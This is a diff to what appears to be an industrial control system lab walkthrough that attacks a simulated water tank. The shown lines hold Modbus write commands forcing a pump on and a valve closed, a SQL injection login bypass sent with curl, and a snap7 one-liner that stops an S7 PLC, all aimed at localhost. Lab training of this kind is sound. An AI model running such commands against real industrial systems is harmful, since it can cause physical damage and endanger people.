@@ -156,8 +156,8 @@ Tank is at 50%. Pump running normally. Valve open at 50%. Everything green.
 ### Step 2: Modbus Attack
 ```bash
 # Override PLC logic via Modbus
-modbus write localhost:5502 0 1   # Force pump ON
-modbus write localhost:5502 1 0   # Force valve CLOSED
+sudo modbus 127.0.0.1:5502 write 0 1   # Force pump ON
+sudo modbus 127.0.0.1:5502 write 1 0   # Force valve CLOSED
 ```
 
 ### Step 3: Consequences
@@ -242,7 +242,7 @@ curl -X POST http://localhost:5000/login \
   -d "username=admin' OR '1'='1&password=x"
 
 # Modbus Manipulation
-modbus write localhost:5502 10 9999
+sudo modbus 127.0.0.1:5502 write 10 9999
 
 # S7 PLC Stop
 python3 -c "import snap7; plc=snap7.client.Client(); plc.connect('localhost',0,1,102); plc.plc_stop()"
